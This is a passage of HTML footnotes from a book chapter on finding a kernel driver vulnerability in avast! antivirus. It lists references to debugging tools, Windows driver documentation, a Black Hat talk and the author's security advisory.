href="#ftn.CHP-6-FN-16" class="footnote">72</a>]</sup></p><p><sup>[<a id="CHP-6-FN-17" href="#ftn.CHP-6-FN-17" class="footnote">73</a>]</sup></p><p><sup>[<a id="CHP-6-FN-18" href="#ftn.CHP-6-FN-18" class="footnote">74</a>]</sup><a id="IDX-CHP-6-0047" class="indexterm"/></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-1" href="#CHP-6-FN-1" class="para">57</a>] </sup>See SANS Top 20 Internet Security Problems, Threats and Risks (2007 Annual Update), <a class="ulink" href="http://www.sans.org/top20/2007/">http://www.sans.org/top20/2007/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-2" href="#CHP-6-FN-2" class="para">58</a>] </sup>See <a class="ulink" href="http://www.virustotal.com/">http://www.virustotal.com/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-3" href="#CHP-6-FN-3" class="para">59</a>] </sup>See <a class="ulink" href="http://www.avast.com/">http://www.avast.com/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-4" href="#CHP-6-FN-4" class="para">60</a>] </sup>See <a class="ulink" href="http://www.vmware.com/">http://www.vmware.com/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-5" href="#CHP-6-FN-5" class="para">61</a>] </sup>WinDbg, the “official” Windows Debugger from Microsoft, is distributed as part of the free “Debugging Tools for Windows” suite available at <a class="ulink" href="http://www.microsoft.com/whdc/DevTools/Debugging/default.mspx">http://www.microsoft.com/whdc/DevTools/Debugging/default.mspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-6" href="#CHP-6-FN-6" class="para">62</a>] </sup>You can find a download link for a vulnerable trial version of avast! Professional 4.7 at <a class="ulink" href="http://www.trapkit.de/books/bhd/">http://www.trapkit.de/books/bhd/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-7" href="#CHP-6-FN-7" class="para">63</a>] </sup>See <a class="ulink" href="http://www.nirsoft.net/utils/driverview.html">http://www.nirsoft.net/utils/driverview.html</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-8" href="#CHP-6-FN-8" class="para">64</a>] </sup>See <a class="ulink" href="http://www.hex-rays.com/idapro/">http://www.hex-rays.com/idapro/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-9" href="#CHP-6-FN-9" class="para">65</a>] </sup>See Mark E. Russinovich and David A. Solomon, <span class="emphasis"><em>Microsoft Windows Internals: Microsoft Windows Server 2003, Windows XP, and Windows 2000, 4th ed</em></span>. (Redmond, WA: Microsoft Press, 2005).</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-10" href="#CHP-6-FN-10" class="para">66</a>] </sup>See MSDN Library: Windows Development: Windows Driver Kit: Kernel-Mode Driver Architecture: Reference: Standard Driver Routines: DriverEntry at <a class="ulink" href="http://msdn.microsoft.com/en-us/library/ff544113.aspx">http://msdn.microsoft.com/en-us/library/ff544113.aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-11" href="#CHP-6-FN-11" class="para">67</a>] </sup>WinObj is available at <a class="ulink" href="http://technet.microsoft.com/en-us/sysinternals/bb896657.aspx">http://technet.microsoft.com/en-us/sysinternals/bb896657.aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-12" href="#CHP-6-FN-12" class="para">68</a>] </sup>The Windows Driver Kit can be downloaded at <a class="ulink" href="http://www.microsoft.com/whdc/devtools/WDK/default.mspx">http://www.microsoft.com/whdc/devtools/WDK/default.mspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-13" href="#CHP-6-FN-13" class="para">69</a>] </sup>See MSDN Library: Windows Development: Windows Driver Kit: Kernel-Mode Driver Architecture: Reference: Standard Driver Routines: DispatchDeviceControl available at <a class="ulink" href="http://msdn.microsoft.com/en-us/library/ff543287.aspx">http://msdn.microsoft.com/en-us/library/ff543287.aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-14" href="#CHP-6-FN-14" class="para">70</a>] </sup>See MSDN Library: Windows Development: Windows Driver Kit: Kernel-Mode Driver Architecture: Reference: Kernel Data Types: System-Defined Data Structures: IRP available at <a class="ulink" href="http://msdn.microsoft.com/en-us/library/ff550694.aspx">http://msdn.microsoft.com/en-us/library/ff550694.aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-15" href="#CHP-6-FN-15" class="para">71</a>] </sup>See MSDN Library: Windows Development: Windows Driver Kit: Kernel-Mode Driver Architecture: Design Guide: Writing WDM Drivers: Managing Input/Output for Drivers: Handling IRPs: Using I/O Control Codes: Buffer Descriptions for I/O Control Codes available at <a class="ulink" href="http://msdn.microsoft.com/en-us/library/ff540663.aspx">http://msdn.microsoft.com/en-us/library/ff540663.aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-16" href="#CHP-6-FN-16" class="para">72</a>] </sup>See Jamie Butler, <span class="emphasis"><em>DKOM (Direct Kernel Object Manipulation)</em></span> (presentation, Black Hat Europe, Amsterdam, May 2004), at <a class="ulink" href="http://www.blackhat.com/presentations/win-usa-04/bh-win-04-butler.pdf">http://www.blackhat.com/presentations/win-usa-04/bh-win-04-butler.pdf</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-17" href="#CHP-6-FN-17" class="para">73</a>] </sup>See <a class="ulink" href="http://www.trapkit.de/books/bhd/">http://www.trapkit.de/books/bhd/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-18" href="#CHP-6-FN-18" class="para">74</a>] </sup>My security advisory that describes the details of the avast! vulnerability can be found at <a class="ulink" href="http://www.trapkit.de/advisories/TKADV2008-002.txt">http://www.trapkit.de/advisories/TKADV2008-002.txt</a>.</p></div></div></div></body></html>
